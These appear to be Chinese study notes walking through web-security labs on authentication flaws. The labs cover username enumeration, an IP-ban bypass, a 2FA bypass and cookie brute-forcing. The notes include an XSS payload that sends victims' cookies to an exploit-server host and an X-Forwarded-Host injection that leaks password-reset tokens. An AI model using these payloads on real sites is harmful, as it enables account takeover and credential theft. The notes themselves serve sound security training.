### Lab1
简单的爆破，注意观察返回的 invalid user name 的差异

### Lab2 返回差异观察
无法直接看到返回的差异，用 Intruder 的 Extract 定位后抓包，发现如果用户名正确，返回的末尾变为了空格而非句点

### Lab3 封禁IP
封禁了 IP，发现可以通过修改 X-Forwarded-For 来规避

然后发现用自己的用户名登录时，验证时长显著增长，故考虑观察返回时间来爆破

爆破：用 PinchFork 模式，遍历 X 的同时遍历 username

没写出来，很奇怪，没有明显请求时长改变的账号，可能是多线程的问题

### Lab4 二次认证绕过
在第一次密码登陆过后，已经得到了 Cookie，只要有另一个账号看到登陆后才能访问的 API 即可访问。

### Lab5 验证码未验证归属
登录自己的账号，发现有二次验证，将 verify 改成 carlos，然后进入二次验证界面，爆破验证码。

正常情况下，应该本人输入密码后才能生成验证码，但是这里通过修改 Cookie，绕过了这一步。

### Lab6 持久 Cookie 未加密
观察 Cookie，发现是 Base64 编码，解码后发现是 username:md5(password),故可以尝试爆破

主要是学一下 Intruder 模块的编码转换，有 Hash、Base64、prefix等等可以添加

### Lab7 持久 Cookie + XSS 劫持
观察 Cookie，Base64 解码以后发现还是 username:md5(password)，但是没给字典了，所以要别寻他法。

发现评论板块容易造成 XSS 漏洞，所以 payload：

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

等待点击得到 Cookie，然后解密发现是 md5，直接出密码

### Lab8 修改密码的验证疏漏
修改密码时不验证用户 token，导致一个用户修改时，可以将 user 指向另一个用户。

自己修改，抓包，删掉 token 发现还能正常进行，改 user 为目标用户。

### Lab9 令牌窃取
重置密码时，服务器向用户发送的邮件内容会被 X-Forwarded-For 影响，进而被攻击者控制，然后发送恶意邮件到目标用户，修改密码的 token 泄露。

在请求头添加：

```html
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

更改修改密码的 user 为目标用户，发包，就会发送被篡改过的邮件。进而得到修改用户密码的权限。

### Lab10 修改密码爆破
在修改密码这个接口，对密码输入错误无限制，故可以爆破